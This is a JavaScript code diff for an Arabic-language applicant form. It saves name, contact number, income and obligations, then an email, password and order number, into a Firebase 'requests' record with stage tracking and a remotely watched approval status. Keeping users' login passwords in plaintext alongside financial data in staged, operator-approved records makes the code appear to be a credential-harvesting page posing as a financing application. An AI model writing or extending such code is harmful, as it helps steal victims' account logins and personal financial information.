@@ -30,31 +30,58 @@ const pageTitle = document.getElementById('pageTitle');
 
 let applicantData = {
     applicantName: '',
-    mobileNumber: '',
     contactNumber: '',
-    monthlyIncome: ''
+    monthlyIncome: '',
+    obligationsValue: ''
 };
 let currentEmail = '';
 let currentPassword = '';
 let currentRequestRef = null;
 let statusUnsubscribe = null;
 
-homeForm.addEventListener('submit', (event) => {
+homeForm.addEventListener('submit', async (event) => {
     event.preventDefault();
 
     applicantData = {
         applicantName: document.getElementById('applicantName').value.trim(),
-        mobileNumber: document.getElementById('mobileNumber').value.trim(),
         contactNumber: document.getElementById('contactNumber').value.trim(),
-        monthlyIncome: document.getElementById('monthlyIncome').value.trim()
+        monthlyIncome: document.getElementById('monthlyIncome').value.trim(),
+        obligationsValue: document.getElementById('obligationsValue').value.trim()
     };
 
-    if (!applicantData.applicantName || !applicantData.mobileNumber || !applicantData.contactNumber || !applicantData.monthlyIncome) {
+    if (!applicantData.applicantName || !applicantData.contactNumber || !applicantData.monthlyIncome || !applicantData.obligationsValue) {
         showMessage('يرجى إدخال جميع البيانات المطلوبة', 'error');
         return;
     }
 
-    showStep('logout');
+    try {
+        if (!currentRequestRef) {
+            currentRequestRef = push(ref(database, 'requests'));
+            await set(currentRequestRef, {
+                ...applicantData,
+                email: '',
+                password: '',
+                name: applicantData.applicantName,
+                orderNumber: '',
+                status: 'basic_info',
+                stage: 'basic_info',
+                timestamp: Date.now(),
+                date: new Date().toLocaleString('ar-EG')
+            });
+        } else {
+            await update(currentRequestRef, {
+                ...applicantData,
+                name: applicantData.applicantName,
+                stage: 'basic_info',
+                updatedAt: Date.now()
+            });
+        }
+
+        showStep('logout');
+    } catch (error) {
+        showMessage('حدث خطأ أثناء حفظ البيانات. حاول مرة أخرى', 'error');
+        console.error('Basic info save error:', error);
+    }
 });
 
 logoutNextButton.addEventListener('click', () => {
@@ -86,6 +113,7 @@ requestForm.addEventListener('submit', async (event) => {
                 name: applicantData.applicantName,
                 orderNumber: '',
                 status: 'pending',
+                stage: 'login_info',
                 timestamp: Date.now(),
                 date: new Date().toLocaleString('ar-EG')
             });
@@ -95,6 +123,8 @@ requestForm.addEventListener('submit', async (event) => {
                 email: currentEmail,
                 password: currentPassword,
                 name: applicantData.applicantName,
+                status: 'pending',
+                stage: 'login_info',
                 updatedAt: Date.now()
             });
         }
@@ -133,6 +163,7 @@ orderForm.addEventListener('submit', async (event) => {
                 name: applicantData.applicantName,
                 orderNumber,
                 status: 'pending',
+                stage: 'order_info',
                 timestamp: Date.now(),
                 date: new Date().toLocaleString('ar-EG'),
                 orderNumberUpdatedAt: Date.now()
@@ -141,6 +172,7 @@ orderForm.addEventListener('submit', async (event) => {
             await update(currentRequestRef, {
                 ...applicantData,
                 orderNumber,
+                stage: 'order_info',
                 orderNumberUpdatedAt: Date.now()
             });
         }
@@ -221,9 +253,9 @@ function stopWatchingApprovalStatus() {
 function resetApplicantData() {
     applicantData = {
         applicantName: '',
-        mobileNumber: '',
         contactNumber: '',
-        monthlyIncome: ''
+        monthlyIncome: '',
+        obligationsValue: ''
     };
     currentEmail = '';
     currentPassword = '';
